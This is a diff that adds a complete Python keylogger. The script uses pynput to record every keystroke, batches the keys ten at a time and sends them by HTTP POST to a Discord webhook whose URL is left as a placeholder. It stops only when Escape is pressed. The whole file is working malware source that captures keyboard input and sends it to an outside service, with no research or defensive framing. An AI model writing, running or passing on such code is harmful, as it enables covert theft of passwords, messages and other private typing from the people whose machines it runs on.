@@ -1,0 +1,40 @@
+from pynput.keyboard import Key, Listener
+import requests
+
+# Replace with your Discord webhook URL
+WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
+
+# Buffer to store logged keys before sending them to Discord
+key_buffer = []
+
+# Function to send the logged keys to Discord
+def send_to_discord(log_message):
+    payload = {
+        "content": log_message
+    }
+    try:
+        requests.post(WEBHOOK_URL, json=payload)
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send to Discord: {e}")
+
+def on_press(key):
+    global key_buffer
+    try:
+        # Add the key to the buffer
+        key_buffer.append(str(key).replace("'", ""))
+        # Send to Discord if buffer reaches a certain size
+        if len(key_buffer) >= 10:
+            send_to_discord("".join(key_buffer))
+            key_buffer = []  # Clear the buffer
+    except Exception as e:
+        print(f"Error: {e}")
+
+def on_release(key):
+    # Stop the listener on pressing the escape key
+    if key == Key.esc:
+        send_to_discord("".join(key_buffer))  # Send remaining keys before exiting
+        return False
+
+# Start listening to keyboard events
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
